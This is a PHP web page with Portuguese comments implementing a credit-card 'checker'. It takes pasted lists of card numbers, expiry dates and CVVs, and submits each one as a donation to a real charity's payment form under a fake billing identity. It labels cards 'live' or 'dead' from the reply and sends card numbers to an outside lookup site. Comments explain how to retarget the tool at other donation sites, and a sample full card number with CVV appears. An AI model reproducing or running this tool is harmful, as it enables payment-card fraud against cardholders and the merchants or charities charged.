<?php 

/* echo "A diferença entre as datas ".$data_inicial." e ".$data_final." é de <strong>".$dias."</strong> dias";*/
?>

<html>
    <head>

	        <title>Queen Checker CC</title>
		
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">  
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>  
        <meta charset="UTF-8">
    </head>
	
    <body background="http://i.imgur.com/QXkuXJ9.jpg">
        <center><h2><strong><font color="red">TESTADOR DE INFOCC E GERADAS</strong></h2></font>
            <form name="frm-CardCheck" method="post">
			<?php echo $credits;?>
                <textarea name="CARDLIS" class="input" cols="150" class="form-control" rows="10" placeholder="4093081909142000|07|2021|836  - Delimitadores : | ; / "></textarea>
                <center><BR> <input type="submit" class="btn btn-primary" value="CHECAR" style="width:200px"> </center>
				
            </form>
            <?php


error_reporting(0);
set_time_limit(0);

if(isset($_POST['CARDLIS'])){
    $SetParamList = trim($_POST['CARDLIS']);
    flush(); ob_flush();
    $SetParamList = split("\n", $SetParamList);
    $SetParamCount =  count($SetParamList);
    flush(); ob_flush();
    for($setParamUX = 0; $setParamUX < $SetParamCount; $setParamUX++) {
        $SetParamList = str_replace(" ",  "", $SetParamList);
        $SetParamList = str_replace("\r", "", $SetParamList);
        $SetParamList = str_replace("\n", "", $SetParamList);
        list($card, $mes, $ano, $cvv, $resto) = split("[:|;/]", $SetParamList[$setParamUX]);
		

        flush(); ob_flush();
        $setParamFunction = CardCheck($card, $mes, $ano, $cvv);
        print $setParamFunction;
		}
		 print "<br> <div style='width: 40%;' class='alert alert-info'>Foram testados <strong>{$SetParamCount}</strong> cartões!</div>";
    }
	

function CardCheck($card, $mes, $ano, $cvv) {
	
    if(file_exists(getcwd().'CardCheck_logs.txt')) {
        unlink(getcwd().'CardCheck_logs.txt'); 
    }
     if(file_exists("cookie.txt")){
      unlink("cookie.txt");
    } 
    
switch (substr($card, 0, 1)) {
        case '4':
        $typeCard = 1;
        $typeName = "Visa";
        break;
        case '5':
        $typeCard = 2;
        $typeName = "MasterCard";
		break;
		case '3':
		$typeCard = 3;
		$typeName = "AMEX";
        break;
    }

   
	

//Sorry, you are ineligible for the free trial because you already had a free trial or are currently a Premium Member.
//Sorry, you are ineligible for the free trial because you already had a free trial or are currently a Premium Member.
//Sorry, there was an error with your billing information. Please enter it again.
//Please use a non-expired credit card.
//Please enter the 3 digit security code located on the back of your MasterCard card.
//Sorry, we only accept Visa, Mastercard, American Express or Discover.
//Sorry, we only accept Visa, Mastercard, American Express or Discover.
// Card : 5482+9399+2599+6923  
// Mes : 9
// Ano : 2019
// Cvv : 565

   $ch = curl_init();
                                           
            curl_setopt($ch, CURLOPT_URL, "https://donate.mercyships.org/mercyships/main.php/micro_sites/showpage?id=1&page_number=1"); // aqui voce poe a url que ele vai ser postado, n é a url do site é a url onde vai ser postado, o tamper data quando voce envia a doaçao ele ja te mostra o link no qual o site fez o post...
			
			curl_setopt($ch, CURLOPT_HEADER, 1);
			$User_Agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0';
			// dica, utiliza o tamper data pra pegar tudo...
			//headers, post data, referrer user agent, todas essas parada.
			$request_headers = array();
			$request_headers[] = 'Host: donate.mercyships.org';
			$request_headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0';
			$request_headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
			$request_headers[] = 'Referer: https://donate.mercyships.org/mercyships/main.php/micro_sites/showpage?id=1&page_number=1';
			curl_setopt($ch, CURLOPT_HTTPHEADER, $request_headers);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_POST, 1); 
            curl_setopt($ch, CURLOPT_POSTFIELDS, "submitted_form_id=98&forms%5B%5D=98&forms%5B%5D=97&forms%5B%5D=81&forms%5B%5D=95&forms%5B%5D=96&forms%5B%5D=100&widget_id=1&FormID=3&CommerceID=3&product_97=**Your+chosen+amount&isNew_97=1&frmItem_121=270&donation_value_97_270=3&frmItem_122=monthly&frmItem_nop_122=60&donate_start_date_122%5Bmonth%5D=2&donate_start_date_122%5Bday%5D=29&donate_start_date_122%5Byear%5D=2016&COM%5Bcard_type%5D=1&COM%5Bcard_number%5D=$card&COM%5Bcard_cvv%5D=$cvv&COM%5Bcard_exp_month%5D=$mes&COM%5Bcard_exp_year%5D=$ano&COM%5BsaveAsBillingAddress%5D=1&COM%5Bbilling_name%5D=Lowan+Drye&COM%5Bbilling_phone%5D=%28216%29+801-4176&COM%5Bbilling_email%5D=lodr%40freewebmail.com&MEM%5Basked%5D%5B%5D=1&MEM%5B%5D=1&COM%5Bbilling_address%5D=+5784+Cozy+Embers+Walk&COM%5Bbilling_city%5D=Watertown&COM%5Bbilling_state%5D=OH&COM%5Bbilling_zip%5D=45315-7116&COM%5Bbilling_country%5D=US&custom_fields%5Bentity_type%5D=contribution&CQ%5Basked%5D%5B1%5D%5B1%5D=0&CQ%5Basked%5D%5B1%5D%5B2%5D=0&CQ%5B2%5D=&CQ%5B3%5D=&CQ%5B4%5D=&CQ%5B5%5D=&CQ%5B6%5D=&CQ%5B7%5D=&CQ%5B9%5D=&CQ%5B10%5D=&CQ%5B11%5D=&CQ%5B12%5D=&CQ%5B13%5D=&CQ%5Basked%5D%5B15%5D%5B3%5D=0&CQ%5Basked%5D%5B15%5D%5B4%5D=0&CQ%5B16%5D=&CQ%5B17%5D=&commit=submit"); // aqui é o post data, onde tiver o cartao voce muda pra $card , onde tiver o mes voce poe $mes, onde tiver o ano voce poe $ano, onde tiver o cvc, ou cvv coloque $cvv.
	 $data = curl_exec($ch);
//	 echo $data;
//     die;
    if($data){
	$cc =  substr($card,0,6);
    $curl_ch = curl_init();
    curl_setopt($curl_ch, CURLOPT_URL, "http://tool.shop4key.com/webtools/tool/othertool/bin/");
    curl_setopt($curl_ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl_ch, CURLOPT_POST, TRUE);
    curl_setopt($curl_ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($curl_ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0");
    curl_setopt($curl_ch, CURLOPT_POSTFIELDS, 'listcc='.$card.'&submit=CHECK+NOW');
    $dadosSite = curl_exec($curl_ch);  
    $expl = explode('</td>', $dadosSite);  
    $Banco = $expl[5];  
    $Tipo = $expl[6]; 
    $Pais = $expl[7]; 
    $quatro = $expl[8]; 
	
	    $sshdia  = date('d/m/y'); 
    $sshhora = date('H:i'); 
    $sship   = @getenv('REMOTE_ADDR'); 
    $sshrevers = @gethostbyaddr($ip);
    if($Tipo == ""){ $bandeira = "N/A"; }
    if($Banco == ""){ $type = "N/A"; }
    if($Pais == ""){ $credit = "N/A"; }
    if(stristr($data,'Payment Failure') !== false){
		
		echo "<div class='alert alert-danger' style='width: 90%;'><b style=\"color:gray\">La Firma Checker Die ✘ </b>  | {$card} | {$mes} | {$ano} | {$cvv} |</b> </div>";  
	}elseif(stristr($data,'THANK YOU!') !== false){
        echo "<div class='alert alert-success' style='width: 90%;'><b style=\"color:gray\">Queen Checker Live ✔ </b> <b style=\"color:green\"> | {$card} | {$mes} | {$ano} | {$cvv} | Informações ➜ {$Tipo} | {$Banco} | {$Pais} |</b>Removidos 1 Créditos.</div>";
	}else{
		echo "<div class='alert alert-danger' style='width: 90%;'><b style=\"color:gray\">La Firma Checker Die ✘ </b>  | {$card} | {$mes} | {$ano} | {$cvv} |</b> </div>";
	}
	}
}


            ?>


</div>
   </body>
